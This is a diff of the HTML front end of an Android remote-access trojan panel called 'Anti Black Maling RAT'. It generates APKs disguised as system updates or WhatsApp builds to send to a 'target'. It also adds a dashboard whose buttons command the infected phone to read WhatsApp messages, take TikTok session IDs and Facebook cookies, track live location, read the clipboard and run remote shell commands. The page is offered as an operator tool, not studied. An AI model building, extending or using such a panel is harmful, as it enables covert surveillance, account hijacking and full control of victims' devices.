@@ -3,52 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Anti Black Maling RAT</title>
+    <title>Anti Black Maling RAT - Nawab Zada Hacker</title>
     <link rel="stylesheet" href="style.css">
-    <!-- Firebase SDKs -->
+    <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 </head>
 <body>
 
-    <div class="main-container">
-        <header>
-            <h1>Anti Black Maling RAT</h1>
-            <p class="dev-name">Developer: Nawab Zada Hacker ✌️ 🦅 🙌</p>
-        </header>
-
-        <!-- APK Generator Section -->
-        <div class="card" id="generator-section">
-            <h2>📱 APK Generator</h2>
-            <div class="input-group">
-                <label for="apkName">Enter APK Name:</label>
-                <input type="text" id="apkName" placeholder="e.g., WhatsApp_V8.apk" value="System_Update.apk">
-            </div>
-            
-            <button id="generateBtn" onclick="app.generateAPK()">⚡ Generate & Download</button>
-            
-            <div id="statusMessage" class="status"></div>
+    <!-- Sidebar Navigation -->
+    <div class="sidebar" id="sidebar">
+        <div class="brand">
+            <h3>🦅 Anti Black Maling</h3>
+            <p>Nawab Zada Hacker ✌️</p>
         </div>
-
-        <!-- Features List -->
-        <div class="card">
-            <h3>🔥 Full Control Features</h3>
-            <ul class="feature-list">
-                <li>📍 Real-time GPS Location</li>
-                <li>🔋 Battery & Charging Status</li>
-                <li>📞 Call Logs & SMS Reader</li>
-                <li>📋 Clipboard Monitor</li>
-                <li>🖼️ Gallery & File Manager</li>
-                <li>💬 WhatsApp Message Spy</li>
-                <li>🎥 Camera (Front/Rear) Access</li>
-            </ul>
-        </div>
-
-        <!-- Hidden Admin Link -->
-        <a href="admin.html" class="admin-link">⚙️ Admin Panel</a>
+        <ul class="nav-links">
+            <li onclick="showSection('generator')" class="active"><i class="fas fa-plus-circle"></i> Generate APK</li>
+            <li onclick="showSection('dashboard')"><i class="fas fa-mobile-alt"></i> Target Control</li>
+            <li onclick="window.location.href='admin.html'"><i class="fas fa-user-shield"></i> Owner Admin</li>
+        </ul>
     </div>
 
-    <!-- Main Logic Script -->
+    <!-- Main Content Area -->
+    <div class="main-content">
+        
+        <!-- SECTION 1: APK Generator -->
+        <div id="generator-section" class="section active-section">
+            <h2>📱 APK Generator</h2>
+            <div class="card">
+                <p>Enter name for the APK file to send to target.</p>
+                <input type="text" id="apkNameInput" placeholder="e.g., WhatsApp_V8.apk" value="System_Update.apk">
+                <button onclick="app.generateAPK()" class="btn-primary">Generate & Download</button>
+                <div id="genStatus" class="status-msg"></div>
+            </div>
+        </div>
+
+        <!-- SECTION 2: Target Control Dashboard -->
+        <div id="dashboard-section" class="section">
+            <h2>🎯 Live Target Control</h2>
+            
+            <!-- Stats Row -->
+            <div class="stats-row">
+                <div class="stat-box"><h3>Target Status</h3><p id="targetStatus" class="green-text">Offline</p></div>
+                <div class="stat-box"><h3>Battery</h3><p id="targetBattery">--%</p></div>
+            </div>
+
+            <!-- Remote Control Grid -->
+            <div class="control-grid">
+                
+                <!-- WhatsApp Spy -->
+                <div class="card control-card">
+                    <h4>📞 WhatsApp Control</h4>
+                    <button onclick="app.sendCommand('whatsapp_read')">Read Last 5 Messages</button>
+                    <button onclick="app.sendCommand('whatsapp_location')">Send Location (Fake)</button>
+                </div>
+
+                <!-- TikTok/Facebook Spy -->
+                <div class="card control-card">
+                    <h4>📱 Social Media</h4>
+                    <button onclick="app.sendCommand('tstalk_session')">TikTok Session ID</button>
+                    <button onclick="app.sendCommand('fb_cookies')">Facebook Cookies</button>
+                </div>
+
+                <!-- Device Info -->
+                <div class="card control-card">
+                    <h4>📍 Location & GPS</h4>
+                    <button onclick="app.sendCommand('get_location')">Live Location Map</button>
+                    <button onclick="app.sendCommand('clipboard')">Read Clipboard</button>
+                </div>
+
+                <!-- Full Control -->
+                <div class="card control-card">
+                    <h4>💻 Remote Shell</h4>
+                    <input type="text" id="cmdInput" placeholder="Enter Command (e.g., install)">
+                    <button onclick="app.sendCommand('shell')">Execute</button>
+                </div>
+
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Logic -->
     <script src="firebase-config.js"></script>
     <script src="app.js"></script>
 </body>
